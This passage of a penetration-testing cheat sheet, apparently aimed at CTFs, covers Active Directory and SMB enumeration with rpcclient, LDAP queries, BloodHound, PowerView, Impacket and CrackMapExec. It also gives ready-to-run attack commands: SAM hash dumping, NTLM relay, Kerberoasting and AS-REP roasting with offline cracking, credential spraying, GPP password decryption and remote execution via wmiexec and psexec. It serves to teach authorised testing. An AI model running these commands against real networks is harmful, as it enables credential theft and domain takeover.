**rpcclient commands:**

```
rpcclient $> srvinfo                    # Server information
rpcclient $> enumdomusers               # Enumerate domain users
rpcclient $> enumdomgroups              # Enumerate domain groups
rpcclient $> enumalsgroups builtin      # Enumerate alias groups
rpcclient $> queryuser 0x1f4            # Query specific user (RID 500)
rpcclient $> queryuser username         # Query user by name
rpcclient $> querygroup 0x200           # Query specific group
rpcclient $> querygroupmem 0x200        # Query group members
rpcclient $> querydominfo               # Domain information
rpcclient $> getdompwinfo               # Password policy
rpcclient $> lsaquery                   # LSA query
rpcclient $> lookupsids S-1-5-21-...   # Lookup SID
rpcclient $> lookupnames username       # Lookup name to SID
rpcclient $> enumprinters               # Enumerate printers
rpcclient $> enumdrivers                # Enumerate printer drivers
rpcclient $> netshareenum               # Enumerate shares
rpcclient $> netshareenumall            # Enumerate all shares
rpcclient $> netsharegetinfo share      # Get share info
```

**Automated rpcclient enumeration:**

```bash
# Enumerate users with RID cycling
for i in $(seq 500 1100); do
    rpcclient -U "" -N 192.168.1.10 -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null | grep "User Name"
done

# Extract usernames
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers" | cut -d[ -f2 | cut -d] -f1
```

### Null Session Enumeration

Null sessions allow anonymous connections to Windows systems:

```bash
# Test null session (SMB)
smbclient -L //192.168.1.10 -N

# Net use (Windows)
net use \\192.168.1.10\IPC$ "" /user:""

# enum4linux null session
enum4linux -a -u "" -p "" 192.168.1.10

# rpcclient null session
rpcclient -U "" -N 192.168.1.10
```

[Inference] Null sessions are typically disabled on modern Windows systems (Windows Server 2008+) but may exist on legacy systems or misconfigured servers.

### SMB Share Discovery

**Common default shares:**

- `C$` - Administrative share (C: drive)
- `ADMIN$` - Windows directory
- `IPC$` - Inter-Process Communication
- `NETLOGON` - Domain logon scripts
- `SYSVOL` - Domain public files (Group Policy)
- `print$` - Printer drivers

**Enumerate and access shares:**

```bash
# Find readable/writable shares
smbmap -H 192.168.1.10 -u username -p password

# Mount SMB share (Linux)
mount -t cifs //192.168.1.10/sharename /mnt/smb -o username=user,password=pass

# Unmount
umount /mnt/smb

# smbget (recursive download)
smbget -R smb://192.168.1.10/sharename -U username%password

# Spider shares for interesting files
smbmap -H 192.168.1.10 -u username -p password -A .txt -r --depth 5
```

### Impacket Tools

Python SMB/MSRPC toolkit:

```bash
# SMB server (for file transfers)
impacket-smbserver share /path/to/share

# With authentication
impacket-smbserver share /path/to/share -username user -password pass

# Dump SAM hashes
impacket-secretsdump username:password@192.168.1.10

# Dump from local SAM
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Execute commands via WMI
impacket-wmiexec domain/username:password@192.168.1.10

# Execute commands via PsExec
impacket-psexec domain/username:password@192.168.1.10

# SMB relay attack
impacket-ntlmrelayx -t 192.168.1.10 -smb2support
```

## Active Directory Enumeration

Active Directory (AD) is Microsoft's directory service for Windows domain networks, containing users, computers, groups, and organizational structure.

### LDAP Enumeration

Lightweight Directory Access Protocol queries AD structure:

```bash
# ldapsearch (anonymous)
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local"

# With credentials
ldapsearch -x -h 192.168.1.10 -D "cn=username,dc=domain,dc=local" -w password -b "dc=domain,dc=local"

# Enumerate all users
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)"

# Enumerate all groups
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=group)"

# Enumerate computers
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=computer)"

# Find admin users
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(adminCount=1)"

# Find SPNs (Kerberoasting targets)
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "servicePrincipalName=*" servicePrincipalName

# Extract specific attributes
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName mail

# LDAPS (secure, port 636)
ldapsearch -x -H ldaps://192.168.1.10 -b "dc=domain,dc=local"
```

**Common LDAP filters:**

```
(objectClass=user)                      # All users
(objectClass=group)                     # All groups
(objectClass=computer)                  # All computers
(sAMAccountName=username)               # Specific user
(memberOf=CN=Admins,DC=domain,DC=local) # Group members
(servicePrincipalName=*)                # Service accounts
(adminCount=1)                          # Administrative users
(userAccountControl:1.2.840.113556.1.4.803:=2)  # Disabled accounts
(!(userAccountControl:1.2.840.113556.1.4.803:=2))  # Enabled accounts
```

### BloodHound

Active Directory relationship and attack path visualization:

**Installation:**

```bash
# Install neo4j database
apt install neo4j bloodhound

# Start neo4j
neo4j console
# Access http://localhost:7474 (default creds: neo4j/neo4j)

# Start BloodHound GUI
bloodhound
```

**Data collection (SharpHound):**

```bash
# Windows (from compromised system)
.\SharpHound.exe -c All

# Linux (remote collection)
bloodhound-python -u username -p password -d domain.local -dc dc01.domain.local -c All

# Specific collection methods
bloodhound-python -u username -p password -d domain.local -dc dc01.domain.local -c DCOnly
bloodhound-python -u username -p password -d domain.local -dc dc01.domain.local -c Group,LocalAdmin,Session

# Output to specific directory
bloodhound-python -u username -p password -d domain.local -dc dc01.domain.local -c All --zip
```

**Collection methods:**

- `All` - Everything (default)
- `DCOnly` - Only data from DC
- `Group` - Group memberships
- `LocalAdmin` - Local admin rights
- `Session` - Active sessions
- `Trusts` - Domain trusts
- `ACL` - Access Control Lists
- `Container` - Container relationships
- `GPOLocalGroup` - Group Policy

**BloodHound analysis queries:**

- Find all Domain Admins
- Find shortest path to Domain Admin
- Find computers where Domain Users can RDP
- Find workstations where Domain Users are logged in
- Find servers where Domain Users are logged in
- Find Kerberoastable users
- Find AS-REP Roastable users
- Shortest path from owned principals

### PowerView (PowerShell AD enumeration)

```powershell
# Import PowerView
. .\PowerView.ps1
Import-Module .\PowerView.ps1

# Domain enumeration
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser
Get-DomainUser -Identity username
Get-DomainUser -LDAPFilter "(adminCount=1)"
Get-DomainUser -SPN  # Kerberoastable users
Get-DomainUser -PreauthNotRequired  # AS-REP Roastable

# Group enumeration
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainComputer -Ping

# OU enumeration
Get-DomainOU
Get-DomainOU -Identity "Servers"

# GPO enumeration
Get-DomainGPO
Get-DomainGPOLocalGroup  # GPO local admin assignments

# Trust enumeration
Get-DomainTrust
Get-ForestDomain
Get-ForestTrust

# ACL enumeration
Get-DomainObjectAcl -Identity username
Find-InterestingDomainAcl

# Session enumeration
Get-NetSession -ComputerName dc01
Get-NetLoggedon -ComputerName dc01

# Share enumeration
Find-DomainShare
Find-DomainShare -CheckShareAccess

# Find local admin access
Find-LocalAdminAccess
Find-DomainLocalGroupMember

# Find domain shares with specific content
Find-InterestingDomainShareFile -Include *.doc,*.xls,*.txt
```

### ldapdomaindump

Python tool for AD information dumping:

```bash
# Dump domain information
ldapdomaindump -u 'DOMAIN\username' -p password 192.168.1.10

# Output formats (HTML, JSON, grep)
ldapdomaindump -u 'DOMAIN\username' -p password 192.168.1.10 -o output/

# Resolve names
ldapdomaindump -u 'DOMAIN\username' -p password 192.168.1.10 -r
```

**Output files:**

- `domain_users.html` - All domain users
- `domain_groups.html` - All domain groups
- `domain_computers.html` - All domain computers
- `domain_policy.html` - Domain policies
- `domain_trusts.html` - Domain trusts

### Windapsearch

Python LDAP enumeration script:

```bash
# Install
git clone https://github.com/ropnop/windapsearch
cd windapsearch

# Enumerate users
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 -U

# Enumerate groups
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 -G

# Enumerate computers
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 -C

# Find privileged users
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 --admin-objects

# Find users with SPNs
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 --user-spns

# Custom LDAP query
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 --custom "(objectClass=user)"
```

## Domain Controller Discovery

Identifying Domain Controllers is critical for AD attacks and enumeration.

### DNS-Based Discovery

```bash
# Query for domain controllers
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

# Using dig
dig _ldap._tcp.dc._msdcs.domain.local SRV

# Kerberos KDC discovery
nslookup -type=SRV _kerberos._tcp.domain.local
dig _kerberos._tcp.domain.local SRV

# Global Catalog servers
nslookup -type=SRV _ldap._tcp.gc._msdcs.domain.local

# PDC (Primary Domain Controller)
nslookup -type=SRV _ldap._tcp.pdc._msdcs.domain.local
```

### NetBIOS/NBNS Discovery

```bash
# nmblookup
nmblookup -A 192.168.1.10
nmblookup -S domain

# nbtscan
nbtscan 192.168.1.0/24
nbtscan -r 192.168.1.0/24  # Include reverse lookup

# nmap NetBIOS scripts
nmap -p 137 --script nbstat 192.168.1.0/24
```

### LDAP Discovery

```bash
# Identify LDAP servers
nmap -p 389,636,3268,3269 192.168.1.0/24

# LDAP query for domain info
ldapsearch -x -h 192.168.1.10 -s base namingContexts

# RootDSE query
ldapsearch -x -h 192.168.1.10 -s base -b "" "(objectclass=*)"
```

### Kerberos Discovery

```bash
# Identify KDCs (port 88)
nmap -p 88 192.168.1.0/24

# Kerberos banner grab
nc 192.168.1.10 88

# Kerberos realm discovery
echo "" | nc -v 192.168.1.10 88
```

### Network-Based Discovery

```bash
# Identify domain controllers in subnet
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay.txt

# Responder in analyze mode
responder -I eth0 -A

# Find computers with typical DC characteristics
nmap -p 88,135,389,445,636,3268,3269,5985,5986 192.168.1.0/24
```

### Windows Native Commands

```cmd
REM Display domain info
echo %LOGONSERVER%
echo %USERDNSDOMAIN%

REM Find domain controllers
nltest /dclist:domain.local
nltest /dsgetdc:domain.local

REM DNS query
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local

REM Net commands
net group "Domain Controllers" /domain
```

```powershell
# PowerShell discovery
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# Get-ADDomainController (requires RSAT)
Get-ADDomainController
Get-ADDomainController -Discover
```

## User Enumeration

Identifying valid users is critical for password attacks and privilege escalation.

### SMB User Enumeration

```bash
# enum4linux user enumeration
enum4linux -U 192.168.1.10

# rpcclient user enumeration
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers"

# CrackMapExec user enumeration
crackmapexec smb 192.168.1.10 -u username -p password --users

# Nmap user enumeration
nmap -p 445 --script smb-enum-users 192.168.1.10
```

### RID Cycling

Enumerate users via Relative Identifier (RID) brute forcing:

```bash
# rpcclient RID cycling
for i in $(seq 500 1100); do
    rpcclient -U "" -N 192.168.1.10 -c "queryuser 0x$(printf '%x\n' $i)"
done | grep "User Name"

# enum4linux RID cycling
enum4linux -r 192.168.1.10
enum4linux -R 500-1100 192.168.1.10

# Impacket lookupsid
impacket-lookupsid domain/username:password@192.168.1.10

# RID cycling with null session
impacket-lookupsid guest@192.168.1.10 -no-pass
```

**Common RIDs:**

- `500` - Administrator
- `501` - Guest
- `502` - KRBTGT
- `512` - Domain Admins
- `513` - Domain Users
- `514` - Domain Guests
- `515` - Domain Computers
- `516` - Domain Controllers
- `518` - Schema Admins
- `519` - Enterprise Admins
- `520` - Group Policy Creator Owners

### Kerberos User Enumeration

```bash
# kerbrute (username enumeration)
kerbrute userenum --dc 192.168.1.10 -d domain.local usernames.txt

# kerbrute with custom delay
kerbrute userenum --dc 192.168.1.10 -d domain.local usernames.txt --delay 100

# nmap Kerberos enum
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local',userdb=users.txt 192.168.1.10
```

[Inference] Kerberos pre-authentication errors differ for valid vs invalid users, enabling username enumeration without triggering account lockouts.

### LDAP User Enumeration

```bash
# ldapsearch all users
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# windapsearch users
./windapsearch.py -d domain.local --dc 192.168.1.10 -U

# Extract usernames only
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:" | awk '{print $2}'
```

### SMTP User Enumeration

Some environments allow SMTP user verification:

```bash
# Netcat SMTP enumeration
nc 192.168.1.10 25
VRFY administrator
VRFY username

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.10
smtp-user-enum -M EXPN -U users.txt -t 192.168.1.10
smtp-user-enum -M RCPT -U users.txt -t 192.168.1.10

# Nmap SMTP enum
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} 192.168.1.10
```

### Username Generation

Creating potential username lists from public information:

```bash
# linkedin2username (requires LinkedIn credentials)
python linkedin2username.py company-name

# namemash (generate username permutations)
namemash.py names.txt

# username-anarchy
./username-anarchy --input-file names.txt --select-format first.last,flast,firstl

# Manual generation
# From: John Smith
# Generate: john.smith, jsmith, smithj, j.smith, john_smith
```

### Common Username Patterns

**Corporate username formats:**

- `firstname.lastname` - john.smith
- `firstnamelastname` - johnsmith
- `firstinitiallastname` - jsmith
- `lastname firstname initial` - smithj
- `firstname_lastname` - john_smith
- `firstname` - john
- `lastname` - smith

### Enumerate Privileged Users

```bash
# Find Domain Admins
net group "Domain Admins" /domain

# CrackMapExec
crackmapexec smb 192.168.1.10 -u username -p password --groups

# ldapsearch admin users
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(adminCount=1)" sAMAccountName

# rpcclient group members
rpcclient -U username 192.168.1.10 -c "querygroupmem 0x200"  # RID 512 = Domain Admins

# PowerView
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"
```

### Password Policy Enumeration

Understanding password policies helps with password attacks:

```bash
# enum4linux password policy
enum4linux -P 192.168.1.10

# CrackMapExec
crackmapexec smb 192.168.1.10 --pass-pol

# rpcclient
rpcclient -U "" -N 192.168.1.10 -c "getdompwinfo"

# ldapsearch password policy
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=domainDNS)" pwdProperties lockoutThreshold maxPwdAge minPwdAge minPwdLength

# polenum (standalone tool)
polenum -u username -p password -d domain.local 192.168.1.10
```

**Password policy attributes:**

- `minPwdLength` - Minimum password length
- `pwdProperties` - Complexity requirements
- `maxPwdAge` - Maximum password age
- `minPwdAge` - Minimum password age
- `lockoutThreshold` - Failed login attempts before lockout
- `lockoutDuration` - Lockout duration
- `lockoutObservationWindow` - Lockout reset window

### Service Account Discovery

Service accounts often have weak passwords or excessive privileges:

```bash
# Find accounts with SPNs
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "servicePrincipalName=*" sAMAccountName servicePrincipalName

# GetUserSPNs (Impacket)
impacket-GetUserSPNs domain.local/username:password -dc-ip 192.168.1.10 -request

# PowerView
Get-DomainUser -SPN

# windapsearch SPN enumeration
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 --user-spns

# setspn (Windows native)
setspn -Q */*
setspn -T domain.local -F -Q */*
```

**Common Service Principal Names (SPNs):**

- `MSSQLSvc/server.domain.local:1433` - SQL Server
- `HTTP/server.domain.local` - Web services
- `HOST/server.domain.local` - Host services
- `TERMSRV/server.domain.local` - Terminal Services
- `WSMAN/server.domain.local` - WinRM
- `RestrictedKrbHost/server.domain.local` - Kerberos services

### AS-REP Roasting

Accounts with Kerberos pre-authentication disabled can be attacked offline:

```bash
# Impacket GetNPUsers
impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format hashcat

# With credentials
impacket-GetNPUsers domain.local/username:password -dc-ip 192.168.1.10 -request

# Output hashes only
impacket-GetNPUsers domain.local/ -dc-ip 192.168.1.10 -usersfile users.txt -no-pass -outputfile hashes.txt

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

**Crack AS-REP hashes:**

```bash
# Hashcat
hashcat -m 18200 hashes.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
```

### Group Membership Enumeration

```bash
# Enumerate all groups
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=group)" cn member

# Specific group members
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(cn=Domain Admins)" member

# rpcclient group enumeration
rpcclient -U username 192.168.1.10 -c "enumdomgroups"
rpcclient -U username 192.168.1.10 -c "querygroup 0x200"
rpcclient -U username 192.168.1.10 -c "querygroupmem 0x200"

# User's group memberships
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(sAMAccountName=username)" memberOf

# Net command (Windows)
net user username /domain
net group "groupname" /domain
```

**Important groups to identify:**

- Domain Admins
- Enterprise Admins
- Schema Admins
- Administrators
- Account Operators
- Backup Operators
- Server Operators
- Print Operators
- Remote Desktop Users
- DNSAdmins
- Group Policy Creator Owners

### Active Session Enumeration

Finding logged-in users helps identify targets for credential theft:

```bash
# CrackMapExec sessions
crackmapexec smb 192.168.1.0/24 -u username -p password --sessions

# CrackMapExec logged-on users
crackmapexec smb 192.168.1.0/24 -u username -p password --loggedon-users

# NetSess (Impacket)
impacket-netview domain.local/username:password -target 192.168.1.10

# nmap session enumeration
nmap -p 445 --script smb-enum-sessions 192.168.1.10
```

```powershell
# PowerView session enumeration
Get-NetSession -ComputerName dc01
Get-NetLoggedon -ComputerName server01

# Invoke-UserHunter (find where domain admins are logged in)
Invoke-UserHunter
Invoke-UserHunter -GroupName "Domain Admins"
```

### Computer Account Enumeration

```bash
# LDAP computer enumeration
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=computer)" dNSHostName operatingSystem

# Filter by OS
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(&(objectClass=computer)(operatingSystem=*Server*))" dNSHostName

# windapsearch computers
./windapsearch.py -d domain.local -u username -p password --dc 192.168.1.10 -C

# rpcclient
rpcclient -U username 192.168.1.10 -c "enumdomains"
```

```powershell
# PowerView computer enumeration
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server 2019*"
Get-DomainComputer -Ping  # Only alive hosts
Get-DomainComputer | Select-Object name,operatingsystem,ipaddress
```

### Trust Enumeration

Domain trusts can provide paths to compromise additional domains:

```bash
# ldapsearch trust enumeration
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=trustedDomain)" trustPartner trustDirection trustType

# nltest (Windows)
nltest /domain_trusts
nltest /domain_trusts /all_trusts

# CrackMapExec
crackmapexec smb 192.168.1.10 -u username -p password --trusted-for-delegation
```

```powershell
# PowerView trust enumeration
Get-DomainTrust
Get-DomainTrust -Domain domain.local
Get-ForestTrust
Get-ForestDomain

# Get-ADTrust (requires RSAT)
Get-ADTrust -Filter *
```

**Trust types:**

- **Parent-Child** - Automatic two-way transitive trust
- **Tree-Root** - Two-way transitive trust between forest roots
- **External** - Non-transitive trust between domains
- **Forest** - Transitive trust between forests
- **Shortcut** - Manually created trust for optimization
- **Realm** - Trust with Kerberos realm (non-Windows)

**Trust directions:**

- **One-way** - Only one domain trusts the other
- **Two-way** - Bidirectional trust (both domains trust each other)
- **Transitive** - Trust extends to trusted domains
- **Non-transitive** - Trust limited to specified domains

### GPO (Group Policy Object) Enumeration

Group policies can contain credentials, scheduled tasks, and configuration information:

```bash
# Enumerate GPOs via LDAP
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath

# Parse SYSVOL for passwords
smbclient //192.168.1.10/SYSVOL -U username -c 'prompt OFF; recurse ON; mget *'
grep -ri "cpassword" .
grep -ri "password" . | grep -v ".pol"

# gpp-decrypt (Group Policy Preferences passwords)
gpp-decrypt <encrypted_cpassword>
```

```powershell
# PowerView GPO enumeration
Get-DomainGPO
Get-DomainGPO -Properties DisplayName,gpcFileSysPath
Get-DomainGPOLocalGroup  # Find local admin assignments via GPO

# Get-GPO (requires RSAT)
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType Html -Path report.html
```

**Group Policy Preferences (GPP) password locations:**

- `\\domain.local\SYSVOL\domain.local\Policies\`
- Groups.xml - Local users/groups
- Services.xml - Service configurations
- Scheduledtasks.xml - Scheduled tasks
- DataSources.xml - Database connections
- Printers.xml - Printer configurations
- Drives.xml - Mapped drives

### Delegation Enumeration

Delegation allows services to impersonate users:

```bash
# Find unconstrained delegation
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=524288)" sAMAccountName

# Find constrained delegation
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo

# CrackMapExec delegation
crackmapexec ldap 192.168.1.10 -u username -p password --trusted-for-delegation
crackmapexec ldap 192.168.1.10 -u username -p password --admin-count
```

```powershell
# PowerView delegation enumeration
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth
Get-DomainUser -TrustedToAuth

# Find resource-based constrained delegation
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'msDS-AllowedToActOnBehalfOfOtherIdentity'}
```

**Delegation types:**

- **Unconstrained delegation** - Service can impersonate any user to any service
- **Constrained delegation** - Service can impersonate to specific services
- **Resource-based constrained delegation** - Resource controls who can delegate

### Certificate Services Enumeration

Active Directory Certificate Services (AD CS) can be exploited:

```bash
# Certutil (Windows)
certutil -config "CA.domain.local\CA-Name" -ping
certutil -TCAInfo

# Find certificate templates
ldapsearch -x -h 192.168.1.10 -b "CN=Configuration,DC=domain,DC=local" "(objectClass=pKICertificateTemplate)"

# Certipy (certificate abuse tool)
certipy find -u username@domain.local -p password -dc-ip 192.168.1.10

# Enumerate vulnerable templates
certipy find -u username@domain.local -p password -dc-ip 192.168.1.10 -vulnerable
```

### ACL (Access Control List) Enumeration

ACLs define permissions and can reveal privilege escalation paths:

```bash
# ldapsearch ACL enumeration
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" nTSecurityDescriptor
```

```powershell
# PowerView ACL enumeration
Get-DomainObjectAcl -Identity username
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find interesting ACLs
Find-InterestingDomainAcl
Find-InterestingDomainAcl -ResolveGUIDs

# Find GenericAll permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Find WriteDACL permissions
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}

# ACL abuse paths
Find-InterestingDomainAcl -ResolveGUIDs | Select-Object IdentityReferenceName,ObjectDN,ActiveDirectoryRights
```

**Dangerous ACL permissions:**

- **GenericAll** - Full control over object
- **GenericWrite** - Write any property
- **WriteOwner** - Change object owner
- **WriteDACL** - Modify permissions
- **AllExtendedRights** - All extended rights (e.g., force password reset)
- **ForceChangePassword** - Reset user password
- **Self** - Self-modification rights

### LAPS (Local Administrator Password Solution) Enumeration

LAPS stores local admin passwords in AD attributes:

```bash
# Check if LAPS is installed
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=computer)" ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# LAPSToolkit (PowerShell)
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
```

```powershell
# PowerView LAPS
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -like "*ms-Mcs-AdmPwd*"}

# Check read permissions on ms-Mcs-AdmPwd attribute
Get-AdmPwdPassword -ComputerName computer01

# CrackMapExec LAPS
crackmapexec smb 192.168.1.0/24 -u username -p password --laps
```

### DNS Zone Enumeration

DNS zones can reveal internal infrastructure:

```bash
# Zone transfer attempt
dig axfr @192.168.1.10 domain.local

# ADIDNS enumeration
ldapsearch -x -h 192.168.1.10 -b "DC=domain.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=local" "(objectClass=dnsNode)"

# adidnsdump
adidnsdump -u domain\\username -p password 192.168.1.10

# PowerView DNS
Get-DomainDNSZone
Get-DomainDNSRecord -ZoneName domain.local
```

### LDAP Attribute Extraction

Useful LDAP attributes for enumeration:

```bash
# Common user attributes
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" \
  sAMAccountName mail description userAccountControl pwdLastSet lastLogon adminCount servicePrincipalName

# User attributes
# sAMAccountName - Username
# userPrincipalName - User principal name
# mail - Email address
# description - Often contains passwords or hints
# userAccountControl - Account status flags
# pwdLastSet - Password last set time
# lastLogon - Last logon timestamp
# adminCount - Marks privileged accounts
# servicePrincipalName - Service account indicator
# memberOf - Group memberships

# Computer attributes
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=computer)" \
  dNSHostName operatingSystem operatingSystemVersion lastLogon servicePrincipalName userAccountControl

# Group attributes
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=group)" \
  cn description member managedBy
```

### Automated Enumeration Scripts

**LinEnum / WinPEAS equivalent for AD:**

```bash
# ADRecon (comprehensive AD enumeration)
.\ADRecon.ps1

# PingCastle (AD security audit)
.\PingCastle.exe --healthcheck --server dc01.domain.local

# ldapdomaindump (automated LDAP dump)
ldapdomaindump -u 'DOMAIN\username' -p password 192.168.1.10 -o output/

# AutoRecon with SMB modules
autorecon 192.168.1.10 --only-scans-dir
```

### Password Attack Target Identification

Enumerate accounts suitable for password attacks:

```bash
# Find accounts without password expiration
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=65536)" sAMAccountName

# Find accounts with password not required
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=32)" sAMAccountName

# Find accounts with reversible encryption
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(userAccountControl:1.2.840.113556.1.4.803:=128)" sAMAccountName

# Old passwords (pwdLastSet > 1 year ago)
ldapsearch -x -h 192.168.1.10 -b "dc=domain,dc=local" "(objectClass=user)" pwdLastSet | grep -B 1 "pwdLastSet"
```

### userAccountControl Flags

Decode userAccountControl attribute (bitwise flags):

**Common values:**

- `512` - Normal account (0x200)
- `514` - Disabled account (0x202)
- `544` - Password not required (0x220)
- `2080` - Workstation trust account (0x820)
- `4096` - Don't expire password (0x1000)
- `66048` - Password never expires + enabled (0x10200)
- `66050` - Password never expires + disabled (0x10202)
- `524288` - Trusted for delegation (0x80000)

```bash
# Decode userAccountControl
# Enabled account: userAccountControl & 2 == 0
# Disabled account: userAccountControl & 2 == 2

# LDAP filter for enabled accounts
(!(userAccountControl:1.2.840.113556.1.4.803:=2))

# LDAP filter for disabled accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)
```

### Kerberoasting Preparation

Identify Kerberoastable accounts:

```bash
# List all SPNs
impacket-GetUserSPNs domain.local/username:password -dc-ip 192.168.1.10

# Request TGS tickets
impacket-GetUserSPNs domain.local/username:password -dc-ip 192.168.1.10 -request

# Output to John format
impacket-GetUserSPNs domain.local/username:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.txt

# Filter for high-value targets (admin accounts)
impacket-GetUserSPNs domain.local/username:password -dc-ip 192.168.1.10 | grep -i admin
```

### Bloodhound Custom Queries

**Custom Cypher queries for BloodHound:**

```cypher
// Find shortest path from owned user to Domain Admin
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((u)-[*1..]->(g)) RETURN p

// Find all Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

// Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find users with DCSync rights
MATCH (u:User)-[:DCSync]->(d:Domain) RETURN u,d

// Find high-value targets owned
MATCH (u:User {owned:true, highvalue:true}) RETURN u

// Find paths from domain users to high value targets
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"}), (h {highvalue:true}), p=shortestPath((g)-[*1..]->(h)) RETURN p

// Find computers where domain users can RDP
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"}), (c:Computer), p=(g)-[:CanRDP]->(c) RETURN p
```

### CTF-Specific Windows Enumeration

**Common CTF Windows enumeration workflow:**

```bash
# 1. Initial port scan
nmap -p- -T4 -A 192.168.1.10

# 2. SMB enumeration
enum4linux -a 192.168.1.10
smbmap -H 192.168.1.10
smbclient -L //192.168.1.10 -N

# 3. User enumeration
crackmapexec smb 192.168.1.10 -u '' -p '' --users
kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt

# 4. Share exploration
smbclient //192.168.1.10/sharename -N
smbmap -H 192.168.1.10 -r --depth 5

# 5. Credential testing
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --continue-on-success

# 6. If credentials found
crackmapexec smb 192.168.1.10 -u username -p password --shares
crackmapexec smb 192.168.1.10 -u username -p password --sam
bloodhound-python -u username -p password -d domain.local -dc dc01.domain.local -c All
```

**Look for in CTF challenges:**

- Files in accessible SMB shares (passwords in descriptions/filenames)
- Null sessions on older systems
- Default credentials (admin/admin, guest/guest)
- Kerberoastable accounts with weak passwords
- AS-REP roastable accounts
- Readable Group Policy Preferences files
